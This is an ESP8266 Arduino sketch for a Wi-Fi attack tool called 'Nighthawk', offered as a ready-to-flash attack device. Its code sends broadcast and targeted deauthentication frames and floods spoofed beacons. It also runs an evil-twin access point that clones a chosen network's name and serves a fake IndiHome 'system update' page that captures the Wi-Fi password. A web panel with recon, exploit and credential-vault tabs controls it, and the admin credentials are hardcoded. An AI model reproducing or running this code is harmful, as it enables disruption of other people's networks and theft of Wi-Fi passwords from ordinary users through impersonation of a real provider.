/* * GMPRO87 v16.0 NIGHTHAWK - ULTIMATE PRO
 * Admin SSID: GMpro | Admin Pass: Sangkur87
 */

#include <Arduino.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

extern "C" { 
  #include "user_interface.h"
}

// ===== CONFIG =====
const char *admin_ssid = "GMpro";
const char *admin_pass = "Sangkur87";
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// ===== SYSTEM STATE =====
int activeMode = 0; // 0:Idle, 1:Mass, 2:Target, 3:Phish, 4:Rick, 5:Karma
String capturedPass = "";
String sysLog = "[INIT] Nighthawk v16.0 Ready.";
struct target_t { String ssid; uint8_t ch; uint8_t bssid[6]; int32_t rssi; };
target_t networks[20], target;
int nCnt = 0;

uint8_t dPkt[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00};

void sendBcn(const char* s, int c) {
  uint8_t p[128]; int sl = strlen(s);
  uint8_t m[6]; for(int i=0;i<6;i++) m[i]=random(256); m[0]=0x00;
  memset(p, 0, 128); p[0]=0x80; memcpy(&p[4],m,6); memcpy(&p[10],m,6); memcpy(&p[16],m,6);
  p[37]=0x00; p[38]=sl; memcpy(&p[39],s,sl);
  int x = 39+sl; p[x]=0x03; p[x+1]=0x01; p[x+2]=(uint8_t)c;
  wifi_set_channel(c); wifi_send_pkt_freedom(p, x+13, 0);
}

// ===== UI TAB PRO =====
void handleAdmin() {
  String h = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>";
  h += "body{background:#0a0a0a;color:#eee;font-family:sans-serif;margin:0} .nav{display:flex;background:#000} .nav b{flex:1;padding:15px;text-align:center;color:#555;cursor:pointer;border-bottom:2px solid #222}";
  h += ".nav .active{color:#ffcc00;border-bottom:2px solid #ffcc00} .c{padding:15px} .card{background:#161616;padding:15px;border-radius:10px;margin-bottom:10px;border:1px solid #333}";
  h += ".btn{width:100%;padding:14px;background:none;border:1px solid #ffcc00;color:#ffcc00;font-weight:bold;margin:5px 0;border-radius:5px}";
  h += ".active-m{background:#ffcc00;color:#000} .log{background:#000;color:#0f0;height:100px;overflow-y:auto;padding:10px;font-size:11px;font-family:monospace}";
  h += "table{width:100%} td{padding:10px 5px;border-bottom:1px solid #222} .lock{color:cyan;text-decoration:none}</style></head><body>";
  h += "<div class='nav'><b id='t1' class='active' onclick='sh(1)'>RECON</b><b id='t2' onclick='sh(2)'>EXPLOIT</b><b id='t3' onclick='sh(3)'>VAULT</b></div><div class='c'>";

  h += "<div id='p1'><h3>Scanner</h3><table>";
  for(int i=0;i<nCnt;i++){ h += "<tr><td><b>"+networks[i].ssid+"</b><br><small>CH:"+String(networks[i].ch)+"</small></td><td align='right'><a class='lock' href='/lock?id="+String(i)+"'>TARGET</a></td></tr>"; }
  h += "</table><button class='btn' onclick=\"location.href='/'\">SCAN</button></div>";

  h += "<div id='p2' style='display:none'><h3>Payload</h3><p>Locked: "+target.ssid+"</p>";
  h += "<button class='btn "+(activeMode==1?"active-m":"")+"' onclick=\"location.href='/set?m=1'\">MASS DEAUTH</button>";
  h += "<button class='btn "+(activeMode==2?"active-m":"")+"' onclick=\"location.href='/set?m=2'\">TARGET DEAUTH</button>";
  h += "<button class='btn "+(activeMode==4?"active-m":"")+"' onclick=\"location.href='/set?m=4'\">RICK ROLL</button>";
  h += "<button class='btn "+(activeMode==5?"active-m":"")+"' onclick=\"location.href='/set?m=5'\">KARMA MODE</button>";
  h += "<button class='btn' style='border-color:red;color:red' onclick=\"location.href='/set?m=0'\">STOP</button></div>";

  h += "<div id='p3' style='display:none'><h3>Vault</h3>";
  if(capturedPass!="") h += "<div class='card' style='border-color:#0f0;color:#0f0'><b>BREACHED:</b><br>"+capturedPass+"</div>";
  h += "<button class='btn "+(activeMode==3?"active-m":"")+"' onclick=\"location.href='/set?m=3'\">START PHISHING</button>";
  h += "<div class='log'>"+sysLog+"</div></div></div>";

  h += "<script>function sh(n){for(i=1;i<=3;i++){document.getElementById('p'+i).style.display='none';document.getElementById('t'+i).className='';}";
  h += "document.getElementById('p'+n).style.display='block';document.getElementById('t'+n).className='active';}</script></body></html>";
  webServer.send(200, "text/html", h);
}

void handlePortal() {
  if (activeMode == 3) {
    if (webServer.hasArg("pass")) {
      capturedPass = target.ssid + " : " + webServer.arg("pass");
      activeMode = 0; webServer.send(200, "text/html", "Success...");
    } else {
      String p = "<html><body style='font-family:sans-serif;background:#f2f2f2'><div style='background:#ed1c24;color:#fff;padding:20px;text-align:center'>IndiHome</div>";
      p += "<div style='padding:20px'><h3>Pembaruan Sistem</h3><p>Masukkan sandi Wi-Fi <b>"+target.ssid+"</b></p><form method='POST'><input name='pass' type='password' style='width:100%;padding:10px;margin:10px 0'><button style='width:100%;background:#ed1c24;color:#fff;padding:10px;border:none'>LANJUT</button></form></div></body></html>";
      webServer.send(200, "text/html", p);
    }
  } else handleAdmin();
}

void setup() {
  system_update_cpu_freq(160);
  WiFi.mode(WIFI_AP_STA); wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(admin_ssid, admin_pass);
  dnsServer.start(53, "*", apIP);
  webServer.on("/", handlePortal);
  webServer.on("/set", [](){
    activeMode = webServer.arg("m").toInt();
    if(activeMode == 3) WiFi.softAP(target.ssid.c_str());
    else WiFi.softAP(admin_ssid, admin_pass);
    webServer.sendHeader("Location", "/"); webServer.send(302);
  });
  webServer.on("/lock", [](){ target = networks[webServer.arg("id").toInt()]; webServer.sendHeader("Location", "/"); webServer.send(302); });
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest(); webServer.handleClient();
  static unsigned long l = 0;
  if (millis() - l > 40) {
    if (activeMode == 1) { int c = random(1, 14); wifi_set_channel(c); for(int i=10; i<22; i++) dPkt[i] = random(256); wifi_send_pkt_freedom(dPkt, 26, 0); } 
    else if (activeMode == 2 && target.ssid != "") { wifi_set_channel(target.ch); memcpy(&dPkt[10], target.bssid, 6); memcpy(&dPkt[16], target.bssid, 6); wifi_send_pkt_freedom(dPkt, 26, 0); }
    else if (activeMode == 4) { sendBcn("Never Gonna", random(1,14)); sendBcn("Give You Up", random(1,14)); }
    else if (activeMode == 5) { sendBcn("FREE WIFI", random(1,14)); sendBcn("IndiHome_Free", random(1,14)); }
    yield(); l = millis();
  }
  static unsigned long s = 0;
  if(activeMode == 0 && millis() - s > 10000) { nCnt = WiFi.scanNetworks(); for(int i=0; i<min(nCnt, 20); i++) { networks[i] = {WiFi.SSID(i), WiFi.channel(i), {0}, WiFi.RSSI(i)}; memcpy(networks[i].bssid, WiFi.BSSID(i), 6); } s = millis(); }
}
